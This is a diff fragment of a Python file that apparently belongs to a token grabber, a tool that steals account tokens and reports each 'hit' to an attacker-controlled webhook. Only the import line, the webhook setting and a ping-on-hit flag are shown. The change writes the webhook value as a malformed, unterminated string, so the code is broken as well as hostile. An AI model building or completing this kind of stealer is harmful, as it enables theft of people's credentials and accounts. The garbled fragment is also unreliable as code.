@@ -5,7 +5,8 @@ import json
 from urllib.request import Request, urlopen
 
 # your webhook URL
-WEBHOOK_URL = 'WEBHOOK HERE'
+WEBHOOK_URL = ' [token-grabber.py]
+'
 
 # mentions you when you get a hit
 PING_ME = False
